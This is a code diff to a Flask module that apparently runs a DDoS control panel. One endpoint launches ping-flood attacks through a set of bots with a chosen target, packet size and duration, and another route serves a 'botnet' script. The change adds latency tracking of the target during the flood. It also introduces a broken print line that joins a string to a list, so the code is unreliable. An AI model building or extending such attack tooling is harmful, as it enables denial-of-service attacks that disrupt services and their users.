@@ -8,6 +8,7 @@ from app import db
 import sys
 
 ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")
+latencyPingList = []
 
 @ddosAttack.post("/")
 def DDOSAttack():
@@ -17,6 +18,7 @@ def DDOSAttack():
     packetSize = data["packetSize"]
     attackType = data["attackType"]
     duration = data["duration"]
+    latencyPingList.clear()
 
     command = getCommand("DDOS", "PINGFLOOD")
     command = command.format(
@@ -31,7 +33,8 @@ def DDOSAttack():
     bots.start()
     bots.join()
 
-    logActivityDOS("DOS ATTACK", data)
+    print('this is the latency list \n' + latencyPingList)
+    logActivityDOS("DDOS ATTACK", data, latencyPingList)
 
     return ""
 
@@ -50,9 +53,11 @@ def checkLatency():
     line = lines[1]
 
     if "time" in line:
-        return '[PING SUCCESS] ' + line
+        latencyPingList.append('[PING SUCCESS] ' + line)
     else:
-        return '[PING FAILED] ' + line
+        latencyPingList.append('[PING FAILED] ' + line)
+
+    return latencyPingList[-1]
     
 @ddosAttack.get("/botnet")
 def getBotnetScript():
